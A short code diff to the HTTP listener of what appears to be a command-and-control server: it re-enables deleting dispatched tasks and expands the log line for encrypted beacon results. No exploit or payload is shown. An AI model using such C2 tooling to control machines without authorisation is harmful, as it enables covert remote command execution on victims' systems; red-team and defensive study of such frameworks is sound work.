@@ -64,8 +64,7 @@ class HTTP_listener:
                 com_code = task[0][0]
                 enc_comm = task[0][1]
                 send_it = ENCRYPT(f'VALID {com_code} {enc_comm}', self.key)
-
-                # self.stash.del_commands(com_code)
+                self.stash.del_commands(com_code)
                 return (send_it, 200)
             else:
                 # return (render_template(f'404.html', title = '404'), 404)
@@ -76,7 +75,7 @@ class HTTP_listener:
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
                 result = DECRYPT(enc_result, self.key)
-                success(f'Beacon {name} -> {result}')
+                success(f'Beacon name: {name} - Results to task {code} -> {result}')
                 # self.stash.sql_stash( '''INSERT INTO commands_history(output) VALUES( ? ) WHERE command_code = ? ;''', (result, code) )
                 self.stash.sql_stash( '''UPDATE commands_history SET output = ? WHERE command_code = ? ;''', (result, code) )
                 return ('', 204)
